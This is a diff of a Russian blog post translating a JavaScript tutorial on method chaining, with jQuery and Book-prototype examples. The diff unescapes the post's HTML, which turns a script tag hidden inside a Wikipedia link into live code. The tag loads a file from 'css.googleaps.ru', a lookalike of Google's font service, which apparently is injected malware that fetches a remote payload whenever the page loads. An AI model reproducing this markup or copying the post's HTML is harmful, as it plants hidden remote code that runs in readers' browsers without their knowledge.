@@ -24,14 +24,14 @@ tags:
 - forwebdev
 comments: []
 ---
-<p>Первое что больше всего поражает разработчиков при изучении jQuery, это лёгкость использования <em>чейнинга<&#47;em>&nbsp;&mdash; последовательного вызова методов объекта, разделённых точками:<&#47;p></p>
+<p>Первое что больше всего поражает разработчиков при изучении jQuery, это лёгкость использования <em>чейнинга</em>&nbsp;&mdash; последовательного вызова методов объекта, разделённых точками:</p></p>
 <pre><code class="language-javascript">$("#myDiv")<br />
   .addClass("myClass")<br />
   .css("color", "red")<br />
-  .append("some text");<&#47;code><&#47;pre></p>
-<p>Это весьма мощный подход. Но&nbsp;если вы&nbsp;не&nbsp;понимаете, как он&nbsp;работает, он&nbsp;может показаться вам загадочным и&nbsp;сложным. К&nbsp;счастью, такой подход легко реализовать&nbsp;&mdash; этим мы&nbsp;и&nbsp;займёмся.<&#47;p></p>
-<p>Этот &laquo;jQuery-стайл&raquo; чейнинг также известен как <a rel="nofollow" href="https:&#47;&#47;ru.wikipedia.org&#47;wiki&#47;Fluent_interface">текучий интерфейс<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;a>. Фундаментальная вещь, которая заставляет такой интерфейс работать&nbsp;&mdash; это возвращение объекта каждым методом. Благодаря этому методы становится возможным вызывать один за&nbsp;другим.<&#47;p></p>
-<p>Всё это немного абстрактно, поэтому давайте сразу перейдём к&nbsp;практике:<&#47;p></p>
+  .append("some text");</code></pre></p>
+<p>Это весьма мощный подход. Но&nbsp;если вы&nbsp;не&nbsp;понимаете, как он&nbsp;работает, он&nbsp;может показаться вам загадочным и&nbsp;сложным. К&nbsp;счастью, такой подход легко реализовать&nbsp;&mdash; этим мы&nbsp;и&nbsp;займёмся.</p></p>
+<p>Этот &laquo;jQuery-стайл&raquo; чейнинг также известен как <a rel="nofollow" href="https://ru.wikipedia.org/wiki/Fluent_interface">текучий интерфейс<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></a>. Фундаментальная вещь, которая заставляет такой интерфейс работать&nbsp;&mdash; это возвращение объекта каждым методом. Благодаря этому методы становится возможным вызывать один за&nbsp;другим.</p></p>
+<p>Всё это немного абстрактно, поэтому давайте сразу перейдём к&nbsp;практике:</p></p>
 <pre><code class="language-javascript">function Book(name, author) {<br />
   this.name = name;<br />
   this.author = author;<br />
@@ -45,23 +45,23 @@ comments: []
   return this;<br />
 }</p>
 <p>lotr = new Book("Lord of the Rings", "Tolkien");</p>
-<p>&#47;&#47; Выведет: {<br />
-&#47;&#47;  name: "Lord of the Rings",<br />
-&#47;&#47;  author: "Tolkien"<br />
-&#47;&#47; }<br />
+<p>// Выведет: {<br />
+//  name: "Lord of the Rings",<br />
+//  author: "Tolkien"<br />
+// }<br />
 console.log(lotr);</p>
-<p>&#47;&#47; Упс! Данные оказались неверными.<br />
-&#47;&#47; Давайте исправим их.<br />
-lotr.setAuthor("JRR Tolkien") &#47;&#47; Возвращает `lotr`<br />
-    .setName("The Lord of the Rings"); &#47;&#47; Возвращает `lotr`</p>
-<p>&#47;&#47; Выведет: {<br />
-&#47;&#47;  name: "Властелин колец",<br />
-&#47;&#47;  author: "JRR Tolkien"<br />
-&#47;&#47; }<br />
-console.log(lotr);<&#47;code><&#47;pre></p>
-<p>Вся фишка заключается в&nbsp;методах прототипа. Мы&nbsp;создали методы <code>setName<&#47;code> и&nbsp;<code>setAuthor<&#47;code>&nbsp;&mdash; они могут быть вызваны у&nbsp;любого объекта <code>Book<&#47;code>. Когда эти методы завершают свою работу, они возвращают объект, у&nbsp;которого они изначально были вызваны.<&#47;p></p>
-<p>Так как этим объектом был <code>Book<&#47;code>, мы&nbsp;можем немедленно вызвать любой из&nbsp;методов класса <code>Book<&#47;code>. И&nbsp;это всё, что требуется для использования чейнинга.<&#47;p></p>
-<p>Спасибо за&nbsp;чтение!<&#47;p></p>
-<p><small>Оригинал: <a href="http:&#47;&#47;adripofjavascript.com&#47;blog&#47;drips&#47;creating-chainable-interfaces-in-javascript.html">Creating Chainable Interfaces in&nbsp;JavaScript<&#47;a>.<&#47;small><&#47;p></p>
-<p>Запись <a rel="nofollow" href="http:&#47;&#47;forwebdev.ru&#47;javascript&#47;chaining&#47;">Используем цепочки методов<&#47;a> впервые появилась <a rel="nofollow" href="http:&#47;&#47;forwebdev.ru">For Web<&#47;a>.<&#47;p><br />
-Source: http:&#47;&#47;forwebdev.ru</p>
+<p>// Упс! Данные оказались неверными.<br />
+// Давайте исправим их.<br />
+lotr.setAuthor("JRR Tolkien") // Возвращает `lotr`<br />
+    .setName("The Lord of the Rings"); // Возвращает `lotr`</p>
+<p>// Выведет: {<br />
+//  name: "Властелин колец",<br />
+//  author: "JRR Tolkien"<br />
+// }<br />
+console.log(lotr);</code></pre></p>
+<p>Вся фишка заключается в&nbsp;методах прототипа. Мы&nbsp;создали методы <code>setName</code> и&nbsp;<code>setAuthor</code>&nbsp;&mdash; они могут быть вызваны у&nbsp;любого объекта <code>Book</code>. Когда эти методы завершают свою работу, они возвращают объект, у&nbsp;которого они изначально были вызваны.</p></p>
+<p>Так как этим объектом был <code>Book</code>, мы&nbsp;можем немедленно вызвать любой из&nbsp;методов класса <code>Book</code>. И&nbsp;это всё, что требуется для использования чейнинга.</p></p>
+<p>Спасибо за&nbsp;чтение!</p></p>
+<p><small>Оригинал: <a href="http://adripofjavascript.com/blog/drips/creating-chainable-interfaces-in-javascript.html">Creating Chainable Interfaces in&nbsp;JavaScript</a>.</small></p></p>
+<p>Запись <a rel="nofollow" href="http://forwebdev.ru/javascript/chaining/">Используем цепочки методов</a> впервые появилась <a rel="nofollow" href="http://forwebdev.ru">For Web</a>.</p><br />
+Source: http://forwebdev.ru</p>
